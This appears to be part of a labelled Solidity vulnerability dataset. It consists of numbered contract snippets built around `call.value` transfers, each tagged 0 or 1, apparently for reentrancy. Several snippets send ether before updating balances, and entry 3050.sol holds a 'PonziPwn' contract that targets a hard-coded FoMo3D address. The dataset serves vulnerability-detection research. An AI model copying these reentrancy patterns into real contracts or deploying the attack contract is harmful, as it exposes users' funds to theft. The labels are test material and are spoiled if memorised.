if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
0
---------------------------------
1350 DAO.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenCreationInterface {
uint public closingTime;
uint public minTokensToCreate;
bool public isFueled;
address public privateCreation;
ManagedAccount public extraBalance;
mapping (address => uint256) weiGiven;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0 && (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount)
&& p.recipient != address(DAOrewardAccount)
&& p.recipient != address(extraBalance)
&& p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
1
---------------------------------
1351 274.sol
function buy(IMultiToken _mtkn, uint256 _minimumReturn, address[] _exchanges, bytes _datas, uint[] _datasIndexes, uint256[] _values) public payable {
require(_datasIndexes.length == _exchanges.length + 1, "buy: _datasIndexes should start with 0 and end with LENGTH");
require(_values.length == _exchanges.length, "buy: _values should have the same length as _exchanges");
for (uint i = 0; i < _exchanges.length; i++) {
bytes memory data = new bytes(_datasIndexes[i + 1] - _datasIndexes[i]);
for (uint j = _datasIndexes[i]; j < _datasIndexes[i + 1]; j++) {
data[j - _datasIndexes[i]] = _datas[j];
require(_exchanges[i].call.value(_values[i])(data), "buy: exchange arbitrary call failed");
j = _mtkn.totalSupply();
uint256 bestAmount = uint256(-1);
for (i = _mtkn.tokensCount(); i > 0; i--) {
ERC20 token = _mtkn.tokens(i - 1);
token.approve(_mtkn, token.balanceOf(this));
uint256 amount = j.mul(token.balanceOf(this)).div(token.balanceOf(_mtkn));
if (amount < bestAmount) {
bestAmount = amount;
require(bestAmount >= _minimumReturn, "buy: return value is too low");
_mtkn.bundle(msg.sender, bestAmount);
if (address(this).balance > 0) {
msg.sender.transfer(address(this).balance);
1
---------------------------------
1352 2072.sol
function executeProposal(uint proposalNumber, bytes transactionBytecode) public {
Proposal storage p = proposals[proposalNumber];
require(now > p.minExecutionDate && !p.executed && p.proposalHash == keccak256(abi.encodePacked(p.recipient, p.amount, transactionBytecode)));
uint quorum = 0;
uint yea = 0;
uint nay = 0;
for (uint i = 0; i <  p.votes.length; ++i) {
Vote storage v = p.votes[i];
uint voteWeight = sharesTokenAddress.balanceOf(v.voter);
quorum += voteWeight;
if (v.inSupport) {
yea += voteWeight;
} else {
nay += voteWeight;
require(quorum >= minimumQuorum);
if (yea > nay ) {
p.executed = true;
require(p.recipient.call.value(p.amount)(transactionBytecode));
p.proposalPassed = true;
} else {
p.proposalPassed = false;
emit ProposalTallied(proposalNumber, yea - nay, quorum, p.proposalPassed);
0
---------------------------------
1353 3050.sol
function withdraw() external;
contract BlankContract {
constructor() public {}
contract AirDropWinner {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
constructor() public {
if(!address(fomo3d).call.value(0.1 ether)()) {
fomo3d.withdraw();
selfdestruct(msg.sender);
contract PonziPwn {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
address private admin;
uint256 private blankContractGasLimit = 20000;
uint256 private pwnContractGasLimit = 250000;
uint256 private gasPrice = 10;
uint256 private gasPriceInWei = gasPrice*1e9;
uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
uint256 private maxAmount = 10 ether;
modifier onlyAdmin() {
require(msg.sender == admin);
constructor() public {
admin = msg.sender;
function deployContracts(uint256 _nContracts,address _newSender) private {
for(uint256 _i; _i < _nContracts; _i++) {
if(_i++ == _nContracts) {
address(_newSender).call.value(0.1 ether)();
new AirDropWinner();
new BlankContract();
0
---------------------------------
1354 3174.sol
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) {
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0) {
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0) {
if (!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))){
_res = _p3d.add(_res);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) {
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0) {
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0) {
if (!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))){
_res = _p3d.add(_res);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns) {
uint256 _com = _eth / 50;
uint256 _long = _eth / 50;
if(_long > 0)
swapDeposit.transfer(_long);
uint256 _p3d;
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != "") {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
if(!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))) {
uint256 __rID = rID_ + 1;
round_[__rID].pot = round_[__rID].pot.add(_p3d);
_p3d = 0;
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns) {
uint256 _com = _eth / 50;
uint256 _long = _eth / 50;
if(_long > 0)
swapDeposit.transfer(_long);
uint256 _p3d;
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != "") {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
if(!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))) {
uint256 __rID = rID_ + 1;
round_[__rID].pot = round_[__rID].pot.add(_p3d);
_p3d = 0;
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
0
---------------------------------
1355 3211.sol
function someFunction() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction2() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit2()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction3() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit3()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction4() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit4()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
1
---------------------------------
1356 10711.sol
function withdrawTo(address _to) public auth {
require(_to.call.value(address(this).balance)());
function unwrapAndSend(TokenInterface wethToken, address _to, uint wethAmt) internal {
wethToken.withdraw(wethAmt);
require(_to.call.value(wethAmt)());
function buyAllAmountPayEth(OtcInterface otc,TokenInterface buyToken,uint buyAmt,TokenInterface wethToken) public payable returns (uint wethAmt) {
wethToken.deposit.value(msg.value)();
if (wethToken.allowance(this, otc) < msg.value) {
wethToken.approve(otc, uint(-1));
wethAmt = otc.buyAllAmount(buyToken, buyAmt, wethToken, msg.value);
buyAmt = min(buyAmt, buyToken.balanceOf(this));
(uint feeAmt, uint buyAmtRemainder) = fees.takeFee(buyAmt, buyToken);
require(buyToken.transfer(owner, feeAmt));
require(buyToken.transfer(msg.sender, buyAmtRemainder));
unwrapAndSend(wethToken, msg.sender, sub(msg.value, wethAmt));
function buyAllAmountPayEth(OtcInterface otc,TokenInterface buyToken,uint buyAmt,TokenInterface wethToken) public payable returns (uint wethAmt) {
wethToken.deposit.value(msg.value)();
if (wethToken.allowance(this, otc) < msg.value) {
wethToken.approve(otc, uint(-1));
wethAmt = otc.buyAllAmount(buyToken, buyAmt, wethToken, msg.value);
buyAmt = min(buyAmt, buyToken.balanceOf(this));
(uint feeAmt, uint buyAmtRemainder) = fees.takeFee(buyAmt, buyToken);
require(buyToken.transfer(owner, feeAmt));
require(buyToken.transfer(msg.sender, buyAmtRemainder));
unwrapAndSend(wethToken, msg.sender, sub(msg.value, wethAmt));
0
---------------------------------
1357 10970.sol
function execute(address _to, uint256 _value, bytes _data) mostOwner(keccak256(msg.data)) external returns (bool){
require(_to != address(0));
Withdraw(_to, _value, msg.sender);
return _to.call.value(_value)(_data);
0
---------------------------------
1358 12114.sol
function withdrawAndSend(TokenInterface wethToken, uint wethAmt) internal {
wethToken.withdraw(wethAmt);
require(msg.sender.call.value(wethAmt)());
function sellAllAmountBuyEth(OtcInterface otc, TokenInterface payToken, uint payAmt, TokenInterface wethToken, uint minBuyAmt) public returns (uint) {
require(payToken.transferFrom(msg.sender, this, payAmt));
if (payToken.allowance(this, otc) < payAmt) {
payToken.approve(otc, uint(-1));
uint wethAmt = otc.sellAllAmount(payToken, payAmt, wethToken, minBuyAmt);
(uint feeAmt, uint wethAmtRemainder) = takeFee(wethAmt);
require(wethToken.transfer(owner, feeAmt));
withdrawAndSend(wethToken, wethAmtRemainder);
return wethAmtRemainder;
function buyAllAmountBuyEth(OtcInterface otc, TokenInterface wethToken, uint wethAmt, TokenInterface payToken, uint maxPayAmt) public returns (uint payAmt) {
uint payAmtNow = otc.getPayAmount(payToken, wethToken, wethAmt);
require(payAmtNow <= maxPayAmt);
require(payToken.transferFrom(msg.sender, this, payAmtNow));
if (payToken.allowance(this, otc) < payAmtNow) {
payToken.approve(otc, uint(-1));
payAmt = otc.buyAllAmount(wethToken, wethAmt, payToken, payAmtNow);
(uint feeAmt, uint wethAmtRemainder) = takeFee(wethAmt);
require(wethToken.transfer(owner, feeAmt));
withdrawAndSend(wethToken, wethAmtRemainder);
function() public payable {}
0
---------------------------------
1359 14995.sol
function fund() public payable {
if (dateSaleStarted==0 || now < dateSaleStarted)
return _errorBuyingTokens("CrowdSale has not yet started.");
if (now > dateSaleEnded)
return _errorBuyingTokens("CrowdSale has ended.");
if (totalRaised >= hardCap)
return _errorBuyingTokens("HardCap has been reached.");
if (msg.value % 1000000000 != 0)
return _errorBuyingTokens("Must send an even amount of GWei.");
if (!wasSaleStarted) {
wasSaleStarted = true;
emit SaleStarted(now);
uint _amtToFund = (totalRaised + msg.value) > hardCap ? hardCap - totalRaised : msg.value;
uint _numTokens = getTokensFromEth(_amtToFund);
token.mint(msg.sender, _numTokens);
totalRaised += _amtToFund;
emit BuyTokensSuccess(now, msg.sender, _amtToFund, _numTokens);
if (totalRaised < softCap) {
amtFunded[msg.sender] += _amtToFund;
uint _refund = msg.value > _amtToFund ? msg.value - _amtToFund : 0;
if (_refund > 0){
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function endSale() public {
require(wasSaleStarted && !wasSaleEnded);
require(totalRaised >= hardCap || now > dateSaleEnded);
wasSaleEnded = true;
wasSoftCapMet = totalRaised >= softCap;
if (!wasSoftCapMet) {
token.mint(wallet, 1e30);
emit SaleFailed(now);
return;
token.freeze(false);
uint _lockerAmt = token.totalSupply() / 4;
token.mint(locker, _lockerAmt);
locker.startVesting(_lockerAmt, 600);
uint _capitalAmt = (totalRaised * capitalPctBips) / 10000;
if (address(this).balance < _capitalAmt) _capitalAmt = address(this).balance;
treasury.addCapital.value(_capitalAmt)();
if (wallet.call.value(address(this).balance)()) {}
emit SaleSuccessful(now);
function refund() public {
require(wasSaleEnded && !wasSoftCapMet);
require(amtFunded[msg.sender] > 0);
uint _amt = amtFunded[msg.sender];
amtFunded[msg.sender] = 0;
require(msg.sender.call.value(_amt)());
emit UserRefunded(now, msg.sender, _amt);
function fundCapital() public payable {
if (!wasSaleEnded)
return _errorBuyingTokens("Sale has not ended.");
if (!wasSoftCapMet)
return _errorBuyingTokens("SoftCap was not met.");
uint _amtNeeded = capitalFundable();
uint _amount = msg.value > _amtNeeded ? _amtNeeded : msg.value;
if (_amount == 0) {
return _errorBuyingTokens("No capital is needed.");
totalRaised += _amount;
token.mint(msg.sender, _amount);
treasury.addCapital.value(_amount)();
emit BuyTokensSuccess(now, msg.sender, _amount, _amount);
uint _refund = msg.value > _amount ? msg.value - _amount : 0;
if (_refund > 0) {
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function _errorBuyingTokens(string _reason) private {
require(msg.sender.call.value(msg.value)());
emit BuyTokensFailure(now, msg.sender, _reason);
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
function collect() public {
require(msg.sender == owner);
token.collectOwedDividends();
uint _amount = address(this).balance;
if (_amount > 0) require(owner.call.value(_amount)());
emit Collected(now, owner, _amount);
1
---------------------------------
1360 18425.sol
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
0
---------------------------------
1361 21604.sol
function buyToken() public payable {
address currentOwner;
uint256 currentPrice;
uint256 paidTooMuch;
uint256 payment;
if (tokenPrice < tokenPrice2) {
currentOwner = tokenOwner;
currentPrice = tokenPrice;
require(tokenOwner2 != msg.sender);
} else {
currentOwner = tokenOwner2;
currentPrice = tokenPrice2;
require(tokenOwner != msg.sender);
require(msg.value >= currentPrice);
paidTooMuch = msg.value.sub(currentPrice);
payment = currentPrice.div(2);
if (tokenPrice < tokenPrice2) {
tokenPrice = currentPrice.mul(110).div(50);
tokenOwner = msg.sender;
} else {
tokenPrice2 = currentPrice.mul(110).div(50);
tokenOwner2 = msg.sender;
lastBuyBlock = block.number;
flips++;
Transfer(currentOwner, msg.sender, currentPrice);
if (currentOwner != address(0)) {
payoutRound = getRoundId()-3;
currentOwner.call.value(payment).gas(24000)();
if (paidTooMuch > 0)
msg.sender.transfer(paidTooMuch);
function finishRound() public {
require(tokenPrice > tokenStartPrice);
require(lastBuyBlock + newRoundDelay < block.number);
lastBuyBlock = block.number;
address owner = tokenOwner;
uint price = tokenPrice;
if (tokenPrice2>tokenPrice) {
owner = tokenOwner2;
price = tokenPrice2;
uint lastPaidPrice = price.mul(50).div(110);
uint win = this.balance - lastPaidPrice;
if (highestPrice < lastPaidPrice) {
richestPlayer = owner;
highestPrice = lastPaidPrice;
richestRoundId = getRoundId()-1;
tokenPrice = tokenStartPrice;
tokenPrice2 = tokenStartPrice2;
tokenOwner = address(0);
tokenOwner2 = address(0);
payoutRound = getRoundId()-1;
flips = 0;
round++;
NewRound(lastPaidPrice, win / 2, owner);
contractOwner.transfer((this.balance - (lastPaidPrice + win / 2) - win / 10) * 19 / 20);
owner.call.value(lastPaidPrice + win / 2).gas(24000)();
if (richestPlayer!=address(0)) {
payoutRound = richestRoundId;
RichestBonus(win / 10, richestPlayer);
richestPlayer.call.value(win / 10).gas(24000)();
function finishRound() public {
require(tokenPrice > tokenStartPrice);
require(lastBuyBlock + newRoundDelay < block.number);
lastBuyBlock = block.number;
address owner = tokenOwner;
uint price = tokenPrice;
if (tokenPrice2>tokenPrice) {
owner = tokenOwner2;
price = tokenPrice2;
uint lastPaidPrice = price.mul(50).div(110);
uint win = this.balance - lastPaidPrice;
if (highestPrice < lastPaidPrice) {
richestPlayer = owner;
highestPrice = lastPaidPrice;
richestRoundId = getRoundId()-1;
tokenPrice = tokenStartPrice;
tokenPrice2 = tokenStartPrice2;
tokenOwner = address(0);
tokenOwner2 = address(0);
payoutRound = getRoundId()-1;
flips = 0;
round++;
NewRound(lastPaidPrice, win / 2, owner);
contractOwner.transfer((this.balance - (lastPaidPrice + win / 2) - win / 10) * 19 / 20);
owner.call.value(lastPaidPrice + win / 2).gas(24000)();
if (richestPlayer!=address(0)) {
payoutRound = richestRoundId;
RichestBonus(win / 10, richestPlayer);
richestPlayer.call.value(win / 10).gas(24000)();
0
---------------------------------
1362 35978.sol
function init() returns (uint) {
if (!main.NoxonInit.value(12)()) throw;
if (!main.call.value(24)()) revert();
assert(main.balanceOf(address(this)) == 2);
if (main.call.value(23)()) revert();
assert(main.balanceOf(address(this)) == 2);
function init() returns (uint) {
if (!main.NoxonInit.value(12)()) throw;
if (!main.call.value(24)()) revert();
assert(main.balanceOf(address(this)) == 2);
if (main.call.value(23)()) revert();
assert(main.balanceOf(address(this)) == 2);
function test1() returns (uint) {
if (!main.call.value(26)()) revert();
assert(main.balanceOf(address(this)) == 3);
assert(main.emissionPrice() == 24);
return main.balance;
function test2() returns (uint){
if (!main.call.value(40)()) revert();
assert(main.balanceOf(address(this)) == 4);
0
---------------------------------
1363 36968.sol
function claim_bounty(){
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1364 37498.sol
function execute(address _to, uint _value, bytes _data) external onlyowner payable returns (bool){
return _to.call.value(_value)(_data);
0
---------------------------------
1365 37645.sol
function endSale() {
if (saleHasEnded) throw;
if (!minCapReached) throw;
if (msg.sender != executor) throw;
uint256 additionalSFT = (totalSupply.mul(DEV_PORTION)).div(100 - DEV_PORTION);
uint256 totalSupplySafe = totalSupply.add(additionalSFT);
uint256 devShare = additionalSFT;
totalSupply = totalSupplySafe;
balances[devSFTDestination] = devShare;
saleHasEnded = true;
if (this.balance > 0) {
if (!devETHDestination.call.value(this.balance)()) throw;
function withdrawFunds() {
if (0 == this.balance) throw;
if (!minCapReached) throw;
if (!devETHDestination.call.value(this.balance)()) throw;
0
---------------------------------
1366 37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
1367 37707.sol
function claimBounty() preventTheft {
uint balance = bountyAmount[msg.sender];
if (msg.sender.call.value(balance)()) {
totalBountyAmount -= balance;
bountyAmount[msg.sender] = 0;
1
---------------------------------
1368 38250.sol
function endSale() {
if (saleHasEnded) throw;
if (!minCapReached) throw;
if (msg.sender != executor) throw;
saleHasEnded = true;
uint256 additionalSENS = (totalSupply.mul(DEV_PORTION)).div(100 - DEV_PORTION);
uint256 totalSupplySafe = totalSupply.add(additionalSENS);
uint256 devShare = additionalSENS;
totalSupply = totalSupplySafe;
balances[devSENSDestination] = devShare;
if (this.balance > 0) {
if (!devETHDestination.call.value(this.balance)()) throw;
function withdrawFunds() {
if (0 == this.balance) throw;
if (!devETHDestination.call.value(this.balance)()) throw;
0
---------------------------------
1369 38873.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner returns (bytes32 _r) {
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if (!_to.call.value(_value)(_data)) {
throw;
return 0;
_r = keccak256(msg.data, block.number);
if (!confirm(_r) && txs[_r].to == 0) {
txs[_r].to = _to;
txs[_r].value = _value;
txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (txs[_h].to != 0) {
if (!txs[_h].to.call.value(txs[_h].value)(txs[_h].data)) {
throw;
MultiTransact(msg.sender, _h, txs[_h].value, txs[_h].to, txs[_h].data);
delete txs[_h];
return true;
0
---------------------------------
1370 39190.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {
throw;
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
